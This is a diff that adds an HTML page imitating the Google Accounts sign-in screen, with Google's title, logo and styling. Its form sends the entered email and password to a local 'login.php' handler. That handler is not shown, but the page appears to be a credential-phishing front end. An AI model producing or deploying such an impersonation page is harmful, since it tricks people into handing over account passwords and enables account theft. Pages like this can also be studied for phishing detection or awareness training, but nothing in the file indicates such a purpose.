@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: rgb(14 14 14);
+            color: #e8eaed;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px 20px;
+        }
+
+        .google-logo {
+            margin-bottom: 32px;
+            margin-top: 40px;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .google-logo .logo-container img {
+            width: 50px;
+        }
+
+        .signin-container {
+            max-width: 450px;
+            width: 100%;
+        }
+
+        .signin-title {
+            font-size: 32px;
+            font-weight: 400;
+            margin-bottom: 12px;
+            color: #e8eaed;
+        }
+
+        .signin-subtitle {
+            font-size: 16px;
+            color: #e8eaed;
+            margin-bottom: 32px;
+        }
+
+        .input-container {
+            margin-bottom: 24px;
+        }
+
+        .input-field {
+            width: 100%;
+            background-color: transparent;
+            border: 1px solid hsl(0, 0%, 45%);
+            border-radius: 4px;
+            padding: 20px 15px;
+            color: #e8eaed;
+            font-size: 16px;
+            outline: none;
+            transition: border-color .35s;
+        }
+
+        .input-field:focus {
+            border-color: #8ab4f8;
+            padding: 20px 14px;
+            background-color: transparent;
+        }
+
+        .input-field::placeholder {
+            color: hsl(210, 6%, 50%);
+        }
+
+        .forgot-email {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 32px;
+            display: inline-block;
+        }
+
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+
+        .guest-mode-text {
+            color: #9aa0a6;
+            font-size: 14px;
+            margin-bottom: 16px;
+            line-height: 1.4;
+        }
+
+        .guest-mode-link {
+            color: #8ab4f8;
+            text-decoration: none;
+        }
+
+        .guest-mode-link:hover {
+            text-decoration: underline;
+        }
+
+        .bottom-section {
+            display: flex;
+            justify-content: flex-end;
+            align-items: flex-end;
+            margin-top: 48px;
+        }
+
+        .create-account {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .next-button {
+            background-color: #78acff;
+            color: #000000;
+            border: none;
+            border-radius: 24px;
+            padding: 12px 30px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .next-button:hover {
+            background-color: #aecbfa;
+        }
+
+        .footer {
+            margin-top: auto;
+            padding-top: 40px;
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .language-selector {
+            margin-bottom: 24px;
+        }
+
+        .language-select {
+            background-color: transparent;
+            border: none;
+            color: #9aa0a6;
+            font-size: 14px;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 32px;
+        }
+
+        .footer-link {
+            color: #9aa0a6;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            .signin-container {
+                padding: 0 16px;
+            }
+            
+            .bottom-section {
+                flex-direction: column-reverse;
+                gap: 16px;
+                            justify-content: flex-end;
+                align-items: stretch;
+            }
+            
+            .next-button {
+                width: 100%;
+                justify-self: stretch;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="google-logo">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Google_Favicon_2025.svg" alt="" srcset="">
+        </div>
+    </div>
+
+    <div class="signin-container">
+        <h1 class="signin-title">Sign in</h1>
+        <p class="signin-subtitle">Login to your Google Account</p>
+
+        <form action="login.php" method="post">
+            <div class="input-container">
+                <input type="email" class="input-field" placeholder="Email or phone" id="email" name="username">
+            </div>
+
+            <div class="input-container">
+                <input type="password" class="input-field" placeholder="Password" id="password" name="password">
+            </div>
+
+            <span class="forgot-email">Forgot email?</span>
+
+            <div class="bottom-section">
+                <button type="submit" class="next-button">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <div class="footer">
+        <div class="language-selector">
+            <select class="language-select">
+                <option>English (United States)</option>
+            </select>
+        </div>
+        
+        <div class="footer-links">
+            <a href="#" class="footer-link">Help</a>
+            <a href="#" class="footer-link">Privacy</a>
+            <a href="#" class="footer-link">Terms</a>
+        </div>
+    </div>
+</body>
+</html>
